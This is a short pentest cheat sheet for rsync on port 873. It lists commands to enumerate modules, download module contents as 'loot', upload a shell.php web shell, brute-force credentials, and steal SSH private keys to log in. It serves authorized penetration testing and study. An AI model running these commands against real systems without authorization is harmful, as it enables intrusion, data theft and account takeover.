# Rsync (873)

!!! tip "Start here"
    List modules anonymously: `rsync -av --list-only rsync://$IP`. If modules appear, set `$MODULE` to the selected name and inspect it before downloading data.

---

## Enumeration

```bash
nmap -p 873 --script rsync-list-modules $IP
rsync -av --list-only rsync://$IP
```

---

## Download Files

```bash
# Entire module
rsync -av "rsync://$IP/$MODULE" ./loot/

# Single file
rsync -av "rsync://$IP/$MODULE/path/to/file.txt" ./
```

---

## Upload Files

If the module is writable:

```bash
rsync -av ./shell.php "rsync://$IP/$MODULE/path/"
```

---

## Brute Force

```bash
nmap -p 873 --script rsync-brute \
  --script-args "rsync-brute.module=$MODULE,userdb=users.txt,passdb=passwords.txt" $IP
```

`rsync-brute` is intrusive. Set the module name explicitly and constrain the username/password sources and attempt count to the approved test plan.

---

## SSH Key Theft

If home directories are exposed:

```bash
rsync -av "rsync://$IP/$MODULE/home/$USERNAME/.ssh/id_rsa" ./
chmod 600 id_rsa
ssh -i id_rsa user@$IP
```
